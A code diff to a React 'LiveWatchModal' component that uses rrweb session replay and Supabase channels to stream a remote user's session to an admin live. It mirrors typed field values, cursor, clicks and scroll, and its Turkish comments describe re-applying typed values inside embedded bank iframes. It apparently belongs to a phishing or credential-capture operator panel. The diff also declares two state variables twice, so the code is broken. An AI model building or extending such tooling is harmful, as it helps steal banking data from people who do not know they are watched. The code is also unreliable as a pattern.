@@ -87,6 +87,8 @@ export function LiveWatchModal({
   const [currentlyFocusedField, setCurrentlyFocusedField] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<string | null>(null);
   const [actionFeedback, setActionFeedback] = useState<string | null>(null);
+  const [liveCursor, setLiveCursor] = useState<{ x: number; y: number; isClick: boolean; isTouch: boolean } | null>(null);
+  const clickTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
   // Dynamic live fields: Only include fields that actually have values or are interacted with!
   const [liveFields, setLiveFields] = useState<Record<string, string>>(() => {
@@ -115,6 +117,12 @@ export function LiveWatchModal({
   const [eventCount, setEventCount] = useState(0);
   const [lastActivityAt, setLastActivityAt] = useState<number | null>(null);
   const [activeTab, setActiveTab] = useState<"fields" | "device">("fields");
+  const [liveCursor, setLiveCursor] = useState<{
+    x: number;
+    y: number;
+    isClick?: boolean;
+    isTouch?: boolean;
+  } | null>(null);
 
   const playerContainerRef = useRef<HTMLDivElement | null>(null);
   const replayerRef = useRef<any>(null);
@@ -122,6 +130,7 @@ export function LiveWatchModal({
   const reassemblerRef = useRef(new BroadcastReassembler());
   const heartbeatTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const lastMetaEventRef = useRef<any>(null);
+  const clickTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
   // Keyboard shortcut: Escape to close
   useEffect(() => {
@@ -145,10 +154,18 @@ export function LiveWatchModal({
     });
     channelRef.current = channel;
 
-    // Load rrweb dynamically
+    // Load rrweb dynamically — snapshot cok hizli gelip modul henuz
+    // yuklenmemisse pendingSnapshot'a duser, import bitince aninda kurulur.
     let rrwebModule: typeof import("rrweb") | null = null;
+    const pendingSnapshotRef = { current: null as { meta: any; event: any } | null };
     void import("rrweb").then((mod) => {
-      if (!isDisposed) rrwebModule = mod;
+      if (isDisposed) return;
+      rrwebModule = mod;
+      const pending = pendingSnapshotRef.current;
+      if (pending) {
+        pendingSnapshotRef.current = null;
+        rebuildReplayer(pending.meta, pending.event);
+      }
     });
 
     const requestSnapshot = async () => {
@@ -170,12 +187,42 @@ export function LiveWatchModal({
           if (mainIfr.contentDocument) {
             mainIfr.contentDocument.documentElement.style.overflowY = "auto";
             mainIfr.contentDocument.body.style.overflowY = "auto";
+            mainIfr.contentDocument.body.style.minHeight = "100vh";
             const head = mainIfr.contentDocument.head;
             if (head && !head.querySelector("base")) {
               const base = mainIfr.contentDocument.createElement("base");
               base.href = window.location.origin + "/";
               head.insertBefore(base, head.firstChild);
             }
+
+            // Ic banka iframe'leri yuklendiginde son yazilan degerleri
+            // yeniden uygula (gec yukleme = kayip input senkronu engellenir).
+            mainIfr.contentDocument.querySelectorAll("iframe").forEach((nestedIfr: any) => {
+              const ifr = nestedIfr as HTMLIFrameElement;
+              if ((ifr as any).__reapplyAttached) return;
+              (ifr as any).__reapplyAttached = true;
+              ifr.addEventListener("load", () => {
+                setTimeout(() => {
+                  try {
+                    const d = ifr.contentDocument;
+                    if (!d) return;
+                    lastInputActions.forEach((action) => {
+                      const doc = d;
+                      if (action.inputId) {
+                        const el = doc.getElementById(action.inputId) as HTMLInputElement | null;
+                        if (el) { el.value = action.value || ""; return; }
+                      }
+                      if (action.inputName) {
+                        const el = doc.querySelector(`[name="${action.inputName}"]`) as HTMLInputElement | null;
+                        if (el) { el.value = action.value || ""; return; }
+                      }
+                    });
+                  } catch {
+                    /* ignore */
+                  }
+                }, 300);
+              });
+            });
           }
         } catch {
           /* ignore */
@@ -183,7 +230,14 @@ export function LiveWatchModal({
       }
     };
 
+    // Banka iframe'i gec yuklendiginde yazilan degerler kacmasin diye
+    // son input aksiyonlari saklanir, iframe 'load' olunca yeniden uygulanir.
+    const lastInputActions = new Map<string, LiveUserAction>();
+
     const syncInputToReplayerDom = (action: LiveUserAction) => {
+      const key = action.inputId || action.inputName || action.placeholder || action.target || "";
+      if (key) lastInputActions.set(key, action);
+
       const mainIfr = replayerRef.current?.iframe;
       if (!mainIfr?.contentDocument) return;
 
@@ -258,17 +312,9 @@ export function LiveWatchModal({
           speed: 1,
         });
 
-        const repAny = replayer as any;
-        if (typeof repAny.applyEventsSynchronously === "function") {
-          try {
-            repAny.applyEventsSynchronously([meta, snapshotEvent]);
-          } catch {
-            /* ignore */
-          }
-        }
-
         replayer.startLive(meta.timestamp);
 
+        const repAny = replayer as any;
         if (typeof repAny.enableInteract === "function") {
           try {
             repAny.enableInteract();
@@ -295,6 +341,33 @@ export function LiveWatchModal({
           setClientMeta(meta);
           setConnectionStatus("live");
           setLastActivityAt(Date.now());
+        });
+      })
+      .on("broadcast", { event: "client_cursor" }, (payload) => {
+        reassemblerRef.current.receive<any>(payload.payload, (cursor) => {
+          if (isDisposed || !cursor) return;
+          setLiveCursor(cursor);
+          if (clickTimeoutRef.current) clearTimeout(clickTimeoutRef.current);
+          clickTimeoutRef.current = setTimeout(
+            () => setLiveCursor((prev) => (cursor.isClick && prev ? { ...prev, isClick: false } : null)),
+            cursor.isClick ? 500 : 4000
+          );
+        });
+      })
+      .on("broadcast", { event: "client_scroll" }, (payload) => {
+        reassemblerRef.current.receive<any>(payload.payload, (sc) => {
+          if (isDisposed || !sc) return;
+          const mainIfr = replayerRef.current?.iframe;
+          if (mainIfr?.contentWindow) {
+            const doc = mainIfr.contentDocument?.documentElement;
+            const maxScroll = (doc?.scrollHeight || 1000) - mainIfr.clientHeight;
+            const targetTop = sc.scrollRatio != null ? sc.scrollRatio * maxScroll : sc.scrollY;
+            try {
+              mainIfr.contentWindow.scrollTo({ top: targetTop, behavior: "auto" });
+            } catch {
+              /* ignore */
+            }
+          }
         });
       })
       .on("broadcast", { event: "user_action" }, (payload) => {
@@ -343,8 +416,6 @@ export function LiveWatchModal({
             return;
           }
 
-          if (!playerContainerRef.current || !rrwebModule) return;
-
           // When FullSnapshot (type 2) arrives:
           // Sayfa degisimi veya yenileme aninda Replayer'i aninda yeniden kur (1-1 canli senkronizasyon).
           if (event.type === 2) {
@@ -359,6 +430,13 @@ export function LiveWatchModal({
               },
               timestamp: event.timestamp - 1,
             };
+
+            // rrweb modulu veya container henuz hazir degilse snapshot'i kaybetme:
+            // pending'e yaz, import/render bitince otomatik kurulur.
+            if (!playerContainerRef.current || !rrwebModule) {
+              pendingSnapshotRef.current = { meta, event };
+              return;
+            }
 
             const incomingHref = meta?.data?.href || clientMeta?.pathname || "";
             const isNewPage = lastRebuildHref.current !== incomingHref;
@@ -376,23 +454,14 @@ export function LiveWatchModal({
             }
             return;
           } else {
-            // Incremental events: EXECUTE SYNCHRONOUSLY FOR FULL-SPEED, ZERO-LAG RENDERING!
+            // Incremental events (mouse, touch, scroll, dom mutations)
             if (replayerRef.current) {
-              const repAny = replayerRef.current as any;
               try {
-                if (typeof repAny.applyEventsSynchronously === "function") {
-                  repAny.applyEventsSynchronously([event]);
-                } else {
-                  replayerRef.current.addEvent(event);
-                }
-                applyIframeVisibility();
+                replayerRef.current.addEvent(event);
               } catch {
-                try {
-                  replayerRef.current.addEvent(event);
-                } catch {
-                  /* ignore */
-                }
+                /* ignore */
               }
+              applyIframeVisibility();
             }
           }
         });
@@ -422,9 +491,23 @@ export function LiveWatchModal({
       }
     }, 15000);
 
+    // Auto-retry: ilk snapshot gelmezse (chunk kaybi, gec init vs.)
+    // 4 sn'de bir yeniden iste — F5/manuel yenileme gerektirmez.
+    let snapshotRetryCount = 0;
+    const snapshotRetryTimer = setInterval(() => {
+      if (replayerRef.current || snapshotRetryCount >= 8) {
+        clearInterval(snapshotRetryTimer);
+        return;
+      }
+      snapshotRetryCount++;
+      void requestSnapshot();
+    }, 4000);
+
     return () => {
       isDisposed = true;
       if (heartbeatTimerRef.current) clearInterval(heartbeatTimerRef.current);
+      if (clickTimeoutRef.current) clearTimeout(clickTimeoutRef.current);
+      clearInterval(snapshotRetryTimer);
       if (channelRef.current) {
         void sendBroadcastPacket(channelRef.current, "admin_disconnect", {});
         void supabase.removeChannel(channelRef.current);
@@ -919,6 +1002,42 @@ export function LiveWatchModal({
               )}
             </div>
           </div>
+
+          {/* ANYDESK-STYLE LIVE CURSOR OVERLAY */}
+          {liveCursor && playerContainerRef.current && (() => {
+            const container = playerContainerRef.current;
+            if (!container) return null;
+            const rect = container.getBoundingClientRect();
+            const cx = rect.left + liveCursor.x * rect.width;
+            const cy = rect.top + liveCursor.y * rect.height;
+            if (rect.width === 0 || rect.height === 0) return null;
+            return (
+              <div
+                className="fixed z-[9999] pointer-events-none"
+                style={{ left: cx, top: cy }}
+              >
+                {liveCursor.isClick && (
+                  <span className="absolute -left-3 -top-3 w-6 h-6 rounded-full bg-orange-500/60 animate-ping" />
+                )}
+                {liveCursor.isTouch ? (
+                  <span
+                    className="absolute -left-2.5 -top-2.5 w-5 h-5 rounded-full border-2 border-white shadow-lg"
+                    style={{ background: liveCursor.isClick ? "#f97316" : "rgba(249,115,22,0.55)" }}
+                  />
+                ) : (
+                  <svg
+                    className="absolute left-0 top-0 w-5 h-5 drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]"
+                    viewBox="0 0 24 24"
+                    fill={liveCursor.isClick ? "#f97316" : "#ffffff"}
+                    stroke="#1c1917"
+                    strokeWidth="1.5"
+                  >
+                    <path d="M5 3l14 8-6.5 1.2L9 19z" strokeLinejoin="round" />
+                  </svg>
+                )}
+              </div>
+            );
+          })()}
 
           {/* RIGHT SIDEBAR: DYNAMIC LIVE FIELD CARDS */}
           <div
